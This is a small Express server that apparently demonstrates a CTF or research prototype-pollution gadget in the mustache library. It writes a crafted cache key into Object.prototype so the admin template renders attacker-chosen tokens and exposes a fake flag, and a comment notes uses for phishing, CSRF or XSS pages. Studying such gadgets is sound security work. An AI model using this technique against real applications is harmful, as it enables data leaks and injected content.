/**
 * The example server to show the gadgets inside the mustache
 * 
 * The reason why keep the server for this one is that
 * this gadgets use the cacheKey and allow attacker to fully control the IR of template
 * and retrun arbitrary html for the cilent side
 */
const express = require('express');
const mustache = require('mustache');
const path = require('path');
const fs = require('fs');
const app = express();

/**
 * pollute the prototype
 */
fs.readFile("./views/admin.html", function (err, template) {
    cache_key = template + ":{{:}}"
    cache_val = [["name", "flag", 0, 100]] // could be the valid tokens for phishing page, csrf page or xss page.

    Object.prototype[cache_key] = cache_val
})

app.engine('html', function (filePath, options, callback) {
    fs.readFile(filePath, function (err, content) {
        if (err) return callback(err);
        let rendered = mustache.render(content.toString(), options);
        return callback(null, rendered);
    });
});
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'html');
app.use(express.json());

let memo = {};
const FLAG = "FakeCTF{panda-sensei}";

/** Admin panel */
app.get('/admin', (req, res) => {
    res.render('admin', {is_admin:false, flag:FLAG});
});

app.listen(80, () => {
    console.log("Server is up!");
});